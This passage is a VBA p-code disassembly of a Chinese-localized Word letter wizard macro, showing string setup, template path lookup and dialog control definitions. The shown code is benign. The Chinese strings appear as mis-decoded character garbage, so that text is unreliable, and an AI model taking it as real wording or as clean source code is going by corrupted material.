\"216pt\"\n' \tSt pt216_$ \n' Line #131:\n' \tLitStr 0x0003 \"0.5\"\n' \tSt kFtrDist1$ \n' \tQuoteRem 0x0018 0x0015 \" Used in DoStyleMerge\"\n' Line #132:\n' \tLitStr 0x0004 \"0.93\"\n' \tSt kFtrDist2$ \n' \tQuoteRem 0x0018 0x0015 \" Used in DoStyleMerge\"\n' Line #133:\n' \tRem 0x000F \" Error messages\"\n' Line #134:\n' \tLitStr 0x0010 \"\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00b9w\u00b3]\u00abH\u00a5\u00f3\u00a1C\"\n' \tSt kErrLetterNotFound$ \n' Line #135:\n' \tLitStr 0x002E \"\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00b9w\u00b3]\u00abH\u00a5\u00f3\u00a1C\u00bd\u00d0\u00b0\u00f5\u00a6\u00e6\u00a6w\u00b8\u00cb\u00b5{\u00a6\u00a1\u00a8\u00c3\u00bf\u00ef\u00a8\u00fa\u00abH\u00a5\u00f3\u00bdd\u00a8\u00d2\u00a1C\"\n' \tSt kErrThatLetterNotFound$ \n' \tQuoteRem 0x004F 0x0037 \"wizard cannot find this letter. Please choose another.\"\"\n' Line #136:\n' \tLitStr 0x0010 \"\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00b9w\u00b3]\u00abH\u00a5\u00f3\u00a1C\"\n' \tSt kErrLetterNotFound$ \n' Line #137:\n' \tLitStr 0x0022 \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00a6\u00b9\u00abH\u00a5\u00f3\u00a1A\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00a8\u00e4\u00a5\u00a6\u00abH\u00a5\u00f3\u00a1C\"\n' \tSt kErrThatLetterNotFound$ \n' Line #138:\n' \tLitStr 0x0012 \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00bc\u00cb\u00a6\u00a1\u00bdd\u00a5\u00bb\"\n' \tSt kErrStyleNotFound1$ \n' Line #139:\n' \tLitStr 0x0002 \"\u00a1C\"\n' \tSt kErrStyleNotFound2$ \n' Line #140:\n' \tLitStr 0x0017 \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00ab\u00d8\u00a5\u00df\u00abH\u00a5\u00f3\u00a1A\u00a6]\u00ac\u00b0'\"\n' \tSt kErrCannotCreate1$ \n' Line #141:\n' \tLitStr 0x000A \"' \u00a4\u00a3\u00a6s\u00a6b\u00a1C\"\n' \tSt kErrCannotCreate2$ \n' Line #142:\n' \tLitStr 0x000C \"\u00bf\u00e9\u00a4J\u00a4\u00bd\u00a5q\u00a6W\u00ba\u00d9\"\n' \tSt kTypeCompanyName$ \n' Line #143:\n' \tLitStr 0x0016 \"\u00a6^\u00abH\u00a6a\u00a7}\u00a4\u00a3\u00a5i\u00b6W\u00b9L\u00a4\u00ad\u00a6\u00e6\u00a1C\"\n' \tSt kErrMaxLines$ \n' Line #144:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000B \"InitStrings\"\n' Line #145:\n' Line #146:\n' Line #147:\n' Line #148:\n' Line #149:\n' \tQuoteRem 0x0000 0x0017 \"%% StartWizard Macro %%\"\n' Line #150:\n' \tFuncDefn (Public Sub Main())\n' Line #151:\n' \tOptionBase \n' \tLitDI2 0x000C \n' \tRedim StateItems__ 0x0001 (As Variant)\n' Line #152:\n' \tOptionBase \n' \tLitDI2 0x000C \n' \tRedim HideFilePreview__ 0x0001 (As Variant)\n' Line #153:\n' \tOptionBase \n' \tLitDI2 0x0012 \n' \tRedim LetterNames__$ 0x0001 (As String)\n' Line #154:\n' \tOptionBase \n' \tLitDI2 0x0012 \n' \tRedim LetterFiles__$ 0x0001 (As String)\n' Line #155:\n' \tOptionBase \n' \tLitDI2 0x0008 \n' \tRedim RetAddress__$ 0x0001 (As String)\n' Line #156:\n' \tDim \n' \tVarDefn p\n' Line #157:\n' \tDim \n' \tVarDefn x\n' Line #158:\n' \tDim \n' \tVarDefn iWindowNumber\n' Line #159:\n' \tDim \n' \tVarDefn faddr (As String)\n' \tVarDefn freaddr (As String)\n' Line #160:\n' Line #161:\n' \tLitDI2 0x0000 \n' \tSt State \n' Line #162:\n' \tLitDI2 0x0000 \n' \tSt LastState \n' Line #163:\n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd UserDialog 0x0001 \n' \tSet dlg \n' Line #164:\n' \tLitStr 0x0000 \"\"\n' \tSt wizname$ \n' Line #165:\n' \tLitDI2 0x0000 \n' \tSt iWorkDoc \n' Line #166:\n' \tLitDI2 0x0000 \n' \tSt iEmptyDoc \n' Line #167:\n' \tLitStr 0x0000 \"\"\n' \tSt workDoc$ \n' Line #168:\n' \tLitStr 0x0000 \"\"\n' \tSt emptyDoc$ \n' Line #169:\n' \tLitDI2 0x0000 \n' \tSt HelpCtx \n' Line #170:\n' \tLitDI2 0x0000 \n' \tSt gDoogie \n' Line #171:\n' \tLitStr 0x0000 \"\"\n' \tSt LettersPath$ \n' Line #172:\n' \tLitDI2 0x0000 \n' \tSt LetterMax \n' Line #173:\n' \tLitDI2 0x0000 \n' \tSt defLttr \n' Line #174:\n' \tLitDI2 0x0000 \n' \tSt RetAddressLines \n' Line #175:\n' \tLitDI2 0x0000 \n' \tSt gEnvelopeLabel \n' Line #176:\n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd ToolsEnvelopesAndLabels 0x0001 \n' \tSet dlgEL \n' Line #177:\n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd ToolsOptionsUserInfo 0x0001 \n' \tSet toui \n' Line #178:\n' \tLitStr 0x0000 \"\"\n' \tSt gPrewrittenFile$ \n' Line #179:\n' \tLitDI2 0x0000 \n' \tSt gCurrentHeadingPosition \n' Line #180:\n' \tLitDI2 0x0000 \n' \tSt rtDistToLftDist \n' Line #181:\n' \tLitStr 0x0000 \"\"\n' \tSt kThing$ \n' Line #182:\n' \tLitStr 0x0000 \"\"\n' \tSt kUpThing$ \n' Line #183:\n' \tLitStr 0x0000 \"\"\n' \tSt kWizname$ \n' Line #184:\n' \tLitStr 0x0000 \"\"\n' \tSt Wizard_$ \n' Line #185:\n' \tLitStr 0x0000 \"\"\n' \tSt Normal_$ \n' Line #186:\n' \tLitStr 0x0000 \"\"\n' \tSt kGallery$ \n' Line #187:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrBadDoc$ \n' Line #188:\n' \tLitStr 0x0000 \"\"\n' \tSt kTip$ \n' Line #189:\n' \tLitStr 0x0000 \"\"\n' \tSt kLetterPath$ \n' Line #190:\n' \tLitStr 0x0000 \"\"\n' \tSt kLettersDir$ \n' Line #191:\n' \tLitStr 0x0000 \"\"\n' \tSt kLongLettersDir$ \n' Line #192:\n' \tLitStr 0x0000 \"\"\n' \tSt kSetupDialog$ \n' Line #193:\n' \tLitStr 0x0000 \"\"\n' \tSt kCreatingDoc$ \n' Line #194:\n' \tLitStr 0x0000 \"\"\n' \tSt kSaveSettings$ \n' Line #195:\n' \tLitStr 0x0000 \"\"\n' \tSt kRstSettings$ \n' Line #196:\n' \tLitStr 0x0000 \"\"\n' \tSt kRstStylsheet$ \n' Line #197:\n' \tLitStr 0x0000 \"\"\n' \tSt kLookingForLetters$ \n' Line #198:\n' \tLitStr 0x0000 \"\"\n' \tSt kLoadingLetterDetails$ \n' Line #199:\n' \tLitStr 0x0000 \"\"\n' \tSt kLookingFor$ \n' Line #200:\n' \tLitStr 0x0000 \"\"\n' \tSt kEnterRecipientAddress$ \n' Line #201:\n' \tLitStr 0x0000 \"\"\n' \tSt chQuote$ \n' Line #202:\n' \tLitStr 0x0000 \"\"\n' \tSt kAddressATEntry$ \n' Line #203:\n' \tLitStr 0x0000 \"\"\n' \tSt Dot_$ \n' Line #204:\n' \tLitStr 0x0000 \"\"\n' \tSt Letter_$ \n' Line #205:\n' \tLitStr 0x0000 \"\"\n' \tSt kRE$ \n' Line #206:\n' \tLitStr 0x0000 \"\"\n' \tSt kAccountID$ \n' Line #207:\n' \tLitStr 0x0000 \"\"\n' \tSt kDear$ \n' Line #208:\n' \tLitStr 0x0000 \"\"\n' \tSt kRecipient$ \n' Line #209:\n' \tLitStr 0x0000 \"\"\n' \tSt kTypeHere$ \n' Line #210:\n' \tLitStr 0x0000 \"\"\n' \tSt TPath$ \n' Line #211:\n' \tLitStr 0x0000 \"\"\n' \tSt kName$ \n' Line #212:\n' \tLitStr 0x0000 \"\"\n' \tSt kClosePersonal$ \n' Line #213:\n' \tLitStr 0x0000 \"\"\n' \tSt kCloseBusiness$ \n' Line #214:\n' \tLitStr 0x0000 \"\"\n' \tSt kWritersInitials$ \n' Line #215:\n' \tLitStr 0x0000 \"\"\n' \tSt kTypistsInitials$ \n' Line #216:\n' \tLitStr 0x0000 \"\"\n' \tSt kCC$ \n' Line #217:\n' \tLitStr 0x0000 \"\"\n' \tSt kNames$ \n' Line #218:\n' \tLitStr 0x0000 \"\"\n' \tSt kEnclosures$ \n' Line #219:\n' \tLitStr 0x0000 \"\"\n' \tSt kNumber$ \n' Line #220:\n' \tLitStr 0x0000 \"\"\n' \tSt kAttachments$ \n' Line #221:\n' \tLitStr 0x0000 \"\"\n' \tSt kFormalDateFormat$ \n' Line #222:\n' \tLitStr 0x0000 \"\"\n' \tSt kPage$ \n' Line #223:\n' \tLitStr 0x0000 \"\"\n' \tSt kEmptyMacro$ \n' Line #224:\n' \tLitStr 0x0000 \"\"\n' \tSt kInsertAddress$ \n' Line #225:\n' \tLitStr 0x0000 \"\"\n' \tSt kMacroButton$ \n' Line #226:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrLetterNotFound$ \n' Line #227:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrThatLetterNotFound$ \n' Line #228:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrStyleNotFound1$ \n' Line #229:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrStyleNotFound2$ \n' Line #230:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrCannotCreate1$ \n' Line #231:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrCannotCreate2$ \n' Line #232:\n' \tLitStr 0x0000 \"\"\n' \tSt kTypeCompanyName$ \n' Line #233:\n' \tLitStr 0x0000 \"\"\n' \tSt kFntArial$ \n' Line #234:\n' \tLitStr 0x0000 \"\"\n' \tSt kFntWndngs$ \n' Line #235:\n' \tLitStr 0x0000 \"\"\n' \tSt kDfltPageNum$ \n' Line #236:\n' \tLitStr 0x0000 \"\"\n' \tSt pt90_$ \n' Line #237:\n' \tLitStr 0x0000 \"\"\n' \tSt pt72_$ \n' Line #238:\n' \tLitStr 0x0000 \"\"\n' \tSt pt216_$ \n' Line #239:\n' \tLitStr 0x0000 \"\"\n' \tSt kFtrDist1$ \n' Line #240:\n' \tLitStr 0x0000 \"\"\n' \tSt kFtrDist2$ \n' Line #241:\n' \tLitStr 0x0000 \"\"\n' \tSt kErrMaxLines$ \n' Line #242:\n' \tLitStr 0x0000 \"\"\n' \tSt cntmplet$ \n' Line #243:\n' \tLitStr 0x0000 \"\"\n' \tSt proflett$ \n' Line #244:\n' \tLitStr 0x0000 \"\"\n' \tSt eleglett$ \n' Line #245:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyCmpnyName$ \n' Line #246:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyBodyText$ \n' Line #247:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyRetAddr$ \n' Line #248:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyCC$ \n' Line #249:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyEncl$ \n' Line #250:\n' \tLitStr 0x0000 \"\"\n' \tSt kStySigName$ \n' Line #251:\n' \tLitStr 0x0000 \"\"\n' \tSt kStySal$ \n' Line #252:\n' \tLitStr 0x0000 \"\"\n' \tSt kStySubjLine$ \n' Line #253:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyDate$ \n' Line #254:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyInsideAddr$ \n' Line #255:\n' \tLitStr 0x0000 \"\"\n' \tSt kStyRefIntls$ \n' Line #256:\n' Line #257:\n' \tLitStr 0x0008 \"letters\\\"\n' \tSt kLettersDir$ \n' \tQuoteRem 0x0020 0x001F \"letters subdirectory - localize\"\n' Line #258:\n' \tLitStr 0x0009 \"\u00abH\u00a5\u00f3\u00b6\u00c7\u00afu\\\"\n' \tSt kLongLettersDir$ \n' Line #259:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' \tQuoteRem 0x001C 0x001B \"This'll take a little while\"\n' Line #260:\n' \tArgsCall InitStrings 0x0000 \n' Line #261:\n' \tQuoteRem 0x0004 0x0069 \"Get the templates directory. The templates are supposed to be in the same directory as that of the wizard\"\n' Line #262:\n' \tDim \n' \tVarDefn TempDlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileTemplates 0x0001 \n' \tSet TempDlg \n' Line #263:\n' \tLd TempDlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileTemplates 0x0001 \n' Line #264:\n' \tLd TempDlg \n' \tMemLd Template \n' \tSt p$ \n' Line #265:\n' \tLd p$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0014 0x0058 \"user might be creating a new template. Look at the default directory for style templates\"\n' Line #266:\n' \tLd StrWizardPath \n' \tSt TPath$ \n' Line #267:\n' \tLd TPath$ \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [Right$] 0x0002 \n' \tLitStr 0x0001 \"\\\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd TPath$ \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tSt TPath$ \n' \tEndIf \n' Line #268:\n' \tLd TPath$ \n' \tLd kLongLettersDir$ \n' \tAdd \n' \tLitStr 0x0001 \"*\"\n' \tAdd \n' \tLd Dot_$ \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemLd [Files$] 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #269:\n' \tLd TPath$ \n' \tLd kLettersDir$ \n' \tAdd \n' \tSt TPath$ \n' \tQuoteRem 0x002B 0x000A \"short name\"\n' Line #270:\n' \tElseBlock \n' Line #271:\n' \tLd TPath$ \n' \tLd kLongLettersDir$ \n' \tAdd \n' \tSt TPath$ \n' Line #272:\n' \tEndIfBlock \n' Line #273:\n' \tElseBlock \n' Line #274:\n' \tLd p$ \n' \tLitDI2 0x0005 \n' \tLd WordBasic \n' \tArgsMemLd [FileNameInfo$] 0x0002 \n' \tSt TPath$ \n' Line #275:\n' \tEndIfBlock \n' Line #276:\n' Line #277:\n' \tQuoteRem 0x0004 0x0040 \"TPath$ = \"C:\\Program Files\\Microsoft Office\\Templates\\\u00abH\u00a5\u00f3\u00b6\u00c7\u00afu\\\"\"\n' Line #278:\n' \tRem 0x0024 \" Names of templates for style merges\"\n' Line #279:\n' \tLd TPath$ \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [Right$] 0x0002 \n' \tLitStr 0x0001 \"\\\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd TPath$ \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tSt TPath$ \n' \tEndIf \n' Line #280:\n' \tLd TPath$ \n' \tLitStr 0x000E \"\u00b2{\u00a5N\u00a6\u00a1\u00abH\u00a5\u00f3.dot\"\n' \tAdd \n' \tSt cntmplet$ \n' Line #281:\n' \tLd cntmplet$ \n' \tLd WordBasic \n' \tArgsMemLd [Files$] 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd TPath$ \n' \tLitStr 0x000B \"letter1.dot\"\n' \tAdd \n' \tSt cntmplet$ \n' \tEndIf \n' Line #282:\n' Line #283:\n' \tLd TPath$ \n' \tLitStr 0x000E \"\u00b1M\u00b7~\u00a6\u00a1\u00abH\u00a5\u00f3.dot\"\n' \tAdd \n' \tSt proflett$ \n' Line #284:\n' \tLd proflett$ \n' \tLd WordBasic \n' \tArgsMemLd [Files$] 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd TPath$ \n' \tLitStr 0x000B \"letter3.dot\"\n' \tAdd \n' \tSt proflett$ \n' \tEndIf \n' Line #285:\n' Line #286:\n' \tLd TPath$ \n' \tLitStr 0x000E \"\u00a8\u00e5\u00b6\u00ae\u00a6\u00a1\u00abH\u00a5\u00f3.dot\"\n' \tAdd \n' \tSt eleglett$ \n' Line #287:\n' \tLd eleglett$ \n' \tLd WordBasic \n' \tArgsMemLd [Files$] 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd TPath$ \n' \tLitStr 0x000B \"letter2.dot\"\n' \tAdd \n' \tSt eleglett$ \n' \tEndIf \n' Line #288:\n' Line #289:\n' \tLitR8 0x0000 0x0000 0x0000 0x3FF4 \n' \tSt rtDistToLftDist \n' \tQuoteRem 0x001B 0x0025 \"Used in DateTabPlace$ in CreateLetter\"\n' Line #290:\n' \tArgsCall VerifyEnvirons 0x0000 \n' Line #291:\n' \tArgsCall GetPrewrittenDetails 0x0000 \n' Line #292:\n' \tLd kSetupDialog$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #293:\n' Line #294:\n' \tLitDI2 0x022E \n' \tLitDI2 0x00FC \n' \tLd kWizname$ \n' \tLitStr 0x0016 \"StartWizard.DlgControl\"\n' \tLd WordBasic \n' \tArgsMemCall BeginDialog 0x0004 \n' Line #295:\n' Line #296:\n' \tQuoteRem 0x0004 0x0022 \"General controls, 0-7 (hands off!)\"\n' Line #297:\n' \tLitDI2 0x0002 \n' \tLitDI2 0x00D8 \n' \tLitDI2 0x01F4 \n' \tLitDI2 0x000B \n' \tLitStr 0x0007 \"LinePic\"\n' \tLitDI2 0x0001 \n' \tLitStr 0x0008 \"LinePicA\"\n' \tLd WordBasic \n' \tArgsMemCall Picture 0x0007 \n' \tQuoteRem 0x0044 0x001D \"Workaround odd picture bug --\"\n' Line #298:\n' \tLitDI2 0x0082 \n' \tLitDI2 0x00D8 \n' \tLitDI2 0x01A0 \n' \tLitDI2 0x000B \n' \tLitStr 0x0007 \"LinePic\"\n' \tLitDI2 0x0001 \n' \tLitStr 0x0008 \"LinePicB\"\n' \tLd WordBasic \n' \tArgsMemCall Picture 0x0007 \n' \tQuoteRem 0x0046 0x0022 \" use two copies to go entire width\"\n' Line #299:\n' \tLitDI2 0x0029 \n' \tLitDI2 0x00B0 \n' \tLitDI2 0x0049 \n' \tLitDI2 0x0015 \n' \tLd WordBasic \n' \tArgsMemCall OKButton 0x0004 \n' \tQuoteRem 0x002C 0x0036 \"2 -- Will never be seen! (o.w. it'd always be default)\"\n' Line #300:\n' \tLitDI2 0x0093 \n' \tLitDI2 0x00AA \n' \tLitDI2 0x004B \n' \tLitDI2 0x0014 \n' \tLitStr 0x0008 \"\u00b4\u00a3\u00a5\u00dc(&H)\"\n' \tLd WordBasic \n' \tArgsMemCall PushButton 0x0005 \n' \tQuoteRem 0x003C 0x0001 \"3\"\n' Line #301:\n' \tLitDI2 0x00CD \n' \tLitDI2 0x00E4 \n' \tLitDI2 0x004B \n' \tLitDI2 0x0013 \n' \tLd WordBasic \n' \tArgsMemCall CancelButton 0x0004 \n' \tQuoteRem 0x0030 0x0001 \"4\"\n' Line #302:\n' \tLitDI2 0x011E \n' \tLitDI2 0x00E4 \n' \tLitDI2 0x005E \n' \tLitDI2 0x0013 \n' \tLitStr 0x000B \"<\u00a4W\u00a4@\u00a8B(&B)\"\n' \tLd WordBasic \n' \tArgsMemCall PushButton 0x0005 \n' \tQuoteRem 0x0040 0x0001 \"5\"\n' Line #303:\n' \tLitDI2 0x017C \n' \tLitDI2 0x00E4 \n' \tLitDI2 0x005E \n' \tLitDI2 0x0013 \n' \tLitStr 0x000B \"\u00a4U\u00a4@\u00a8B(&N)>\"\n' \tLd WordBasic \n' \tArgsMemCall PushButton 0x0005 \n' \tQuoteRem 0x0040 0x0001 \"6\"\n' Line #304:\n' \tLitDI2 0x01DC \n' \tLitDI2 0x00E4 \n' \tLitDI2 0x004B \n' \tLitDI2 0x0013 \n' \tLitStr 0x0008 \"\u00a7\u00b9\u00a6\u00a8(&F)\"\n' \tLd WordBasic \n' \tArgsMemCall PushButton 0x0005 \n' \tQuoteRem 0x003C 0x0001 \"7\"\n' Line #305:\n' \tLitDI2 0x0007 \n' \tLitDI2 0x0003 \n' \tLitDI2 0x00F0 \n' \tLitDI2 0x00CE \n' \tLitStr 0x0007 \"Preview\"\n' \tLd WordBasic \n' \tArgsMemCall FilePreview 0x0005 \n' \tQuoteRem 0x0038 0x0001 \"8\"\n' Line #306:\n' \tLitDI2 0x0009 \n' \tLitDI2 0x0000 \n' \tArgsSt StateItems__ 0x0001 \n' \tQuoteRem 0x001C 0x002E \"Number of general (state-independent) controls\"\n' Line #307:\n' Line #308:\n' \tQuoteRem 0x0004 0x0024 \"%% Wizard-specific states go here %%\"\n' Line #309:\n' \tQuoteRem 0x0004 0x0007 \"State 1\"\n' Line #310:\n' \tLitDI2 0x0103 \n' \tLitDI2 0x0009 \n' \tLitDI2 0x00E5 \n' \tLitDI2 0x0013 \n' \tLitStr 0x0022 \"\u00ba\u00eb\u00c6F\u00a5i\u00a5H\u00b3]\u00adp\u00a5X\u00bc\u00c6\u00ba\u00d8\u00ab\u00ac\u00a6\u00a1\u00aa\u00ba\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\u00a1C\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #311:\n' \tLitDI2 0x010D \n' \tLitDI2 0x002D \n' \tLitDI2 0x0068 \n' \tLitDI2 0x000D \n' \tLitStr 0x0013 \"\u00b1z\u00b7Q\u00adn\u00a8\u00ba\u00a4@\u00c3\u00fe\u00aa\u00ba\u00abH\u00a5\u00f3?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #312:\n' \tLitStr 0x000C \"LetterMethod\"\n' \tLd WordBasic \n' \tArgsMemCall OptionGroup 0x0001 \n' Line #313:\n' \tLitDI2 0x0122 \n' \tLitDI2 0x0054 \n' \tLitDI2 0x00D7 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0010 \"\u00bc\u00b6\u00bcg\u00b0\u00d3\u00b7~\u00abH\u00a5\u00f3(&B)\"\n' \tLitStr 0x0006 \"optlm2\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #314:\n' \tLitDI2 0x0122 \n' \tLitDI2 0x0068 \n' \tLitDI2 0x00D7 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0010 \"\u00bc\u00b6\u00bcg\u00a8p\u00a4H\u00abH\u00a5\u00f3(&P)\"\n' \tLitStr 0x0006 \"optlm3\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #315:\n' \tLitDI2 0x0133 \n' \tLitDI2 0x003C \n' \tLitDI2 0x00D0 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x0005 \"Text1\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0006 \n' \tQuoteRem 0x0035 0x000B \"Placeholder\"\n' Line #316:\n' \tLitDI2 0x010A \n' \tLitDI2 0x0091 \n' \tLitDI2 0x0028 \n' \tLitDI2 0x000D \n' \tLd kTip$ \n' \tLitStr 0x0004 \"tip1\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0006 \n' Line #317:\n' \tLitDI2 0x013B \n' \tLitDI2 0x0091 \n' \tLitDI2 0x00D0 \n' \tLitDI2 0x0042 \n' \tLitStr 0x0001 \" \"\n' \tLitStr 0x0008 \"tip1text\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0006 \n' Line #318:\n' \tLitDI2 0x0008 \n' \tArgsCall ItemsInState 0x0001 \n' \tQuoteRem 0x0018 0x0018 \"Number of items in state\"\n' Line #319:\n' Line #320:\n' \tQuoteRem 0x0004 0x0017 \"State 2: Letter options\"\n' Line #321:\n' \tLitDI2 0x0106 \n' \tLitDI2 0x0014 \n' \tLitDI2 0x010F \n' \tLitDI2 0x0013 \n' \tLitStr 0x0019 \"\u00b1z\u00b7Q\u00b1N\u00ad\u00fe\u00a8\u00c7\u00b6\u00b5\u00a5\u00d8\u00a5[\u00a4J\u00abH\u00a5\u00f3\u00a4\u00a4?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #322:\n' \tLitDI2 0x011E \n' \tLitDI2 0x0032 \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00ad\u00b6\u00bdX(&P)\"\n' \tLitStr 0x0009 \"chkloPage\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #323:\n' \tLitDI2 0x011E \n' \tLitDI2 0x0046 \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00a4\u00e9\u00b4\u00c1(&D)\"\n' \tLitStr 0x0009 \"chkloDate\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #324:\n' \tLitDI2 0x011E \n' \tLitDI2 0x005A \n' \tLitDI2 0x00FB \n' \tLitDI2 0x0010 \n' \tLitStr 0x001C \"\u00b9q\u00a4l\u00b6l\u00a5\u00f3\u00b1b\u00b8\u00b9\u00a9\u00ce\u00a4\u00e5\u00a5\u00f3\u00c3\u00d1\u00a7O\u00bdX(&I)\"\n' \tLitStr 0x0007 \"chkloID\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #325:\n' \tLitDI2 0x011E \n' \tLitDI2 0x006E \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x000E \"\u00bcg\u00abH\u00aa\u00cc\u00c3\u00b1\u00a6W(&W)\"\n' \tLitStr 0x0013 \"chkloWriterInitials\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #326:\n' \tLitDI2 0x011E \n' \tLitDI2 0x0082 \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x000E \"\u00a5\u00b4\u00a6r\u00aa\u00cc\u00c3\u00b1\u00a6W(&T)\"\n' \tLitStr 0x0013 \"chkloTypistInitials\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #327:\n' \tLitDI2 0x011E \n' \tLitDI2 0x0096 \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00b0\u00c6\u00a5\u00bb(&C)\"\n' \tLitStr 0x0007 \"chkloCC\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #328:\n' \tLitDI2 0x011E \n' \tLitDI2 0x00AA \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00c0H\u00a8\u00e7(&E)\"\n' \tLitStr 0x000F \"chkloEnclosures\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #329:\n' \tLitDI2 0x011E \n' \tLitDI2 0x00BE \n' \tLitDI2 0x00D6 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00aa\u00fe\u00a5\u00f3(&A)\"\n' \tLitStr 0x0010 \"chkloAttachments\"\n' \tLd WordBasic \n' \tArgsMemCall CheckBox 0x0006 \n' Line #330:\n' \tLitDI2 0x0009 \n' \tArgsCall ItemsInState 0x0001 \n' Line #331:\n' Line #332:\n' \tQuoteRem 0x0004 0x0007 \"State 3\"\n' Line #333:\n' \tLitDI2 0x0115 \n' \tLitDI2 0x002C \n' \tLitDI2 0x00E6 \n' \tLitDI2 0x0012 \n' \tLitStr 0x0017 \"\u00b1z\u00adn\u00bf\u00ef\u00a8\u00fa\u00a6\u00f3\u00ba\u00d8\u00ae\u00e6\u00a6\u00a1\u00aa\u00ba\u00abH\u00a5\u00f3?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #334:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemCall OptionGroup 0x0001 \n' Line #335:\n' \tLitDI2 0x012A \n' \tLitDI2 0x0044 \n' \tLitDI2 0x00BD \n' \tLitDI2 0x0010 \n' \tLitStr 0x0010 \"\u00a7t\u00bc\u00d0\u00c0Y\u00aa\u00ba\u00abH\u00a5\u00f3(&L)\"\n' \tLitStr 0x000D \"LetterHeadYes\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #336:\n' \tLitDI2 0x012A \n' \tLitDI2 0x0058 \n' \tLitDI2 0x00BD \n' \tLitDI2 0x0010 \n' \tLitStr 0x0012 \"\u00a4\u00a3\u00a7t\u00bc\u00d0\u00c0Y\u00aa\u00ba\u00abH\u00a5\u00f3(&P)\"\n' \tLitStr 0x000C \"LetterHeadNo\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #337:\n' \tLitDI2 0x0004 \n' \tArgsCall ItemsInState 0x0001 \n' Line #338:\n' Line 